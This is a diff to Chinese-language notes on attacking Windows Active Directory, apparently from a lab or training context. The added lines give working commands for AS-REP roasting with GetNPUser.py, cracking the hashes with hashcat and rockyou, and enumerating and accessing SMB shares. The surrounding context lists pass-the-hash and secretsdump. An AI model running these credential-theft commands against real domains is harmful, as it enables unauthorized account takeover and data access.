@@ -223,7 +223,11 @@ windows active directory
 2、kerbrute userenum  可以枚举域中有哪些用户，前提是你必须给你一个userlist:
    kerbrute userenum -d test.local --dc-ip 192.168.0.1 userlist.txt
 3、GetNPUser.py 可以抓取在域中不用 预验证的用户 hash
-   
+   GetNPUser.py -usersfile user.txt test.local/ --dc-ip 192.168.0.1 -no-pass
+   抓到hash 后可以用hashcat 破解密码
+   hashcat -a 0 -m 18200 hash.txt /usr/share/wordlist/rockyou.txt
+   抓到密码以后可以用smbclient -U svc-admin -L 192.168.0.1  或者crackmapexec test.local -u user -p pass --shares枚举smb共享目录
+   smbclient -U username //192.168.0.1/dir 访问共享目录里的文件了.
 4、GetuserSPNs.py 可以抓取域中服务账户的 hash
 5、secretsdump.py 可以获取域中一些用户的hash ,前提是必须有相关的权限才可以
 6、envil-winrm 可以进行pass the hash攻击，使用前面获取的hash 不用密码可以登录域名账户。
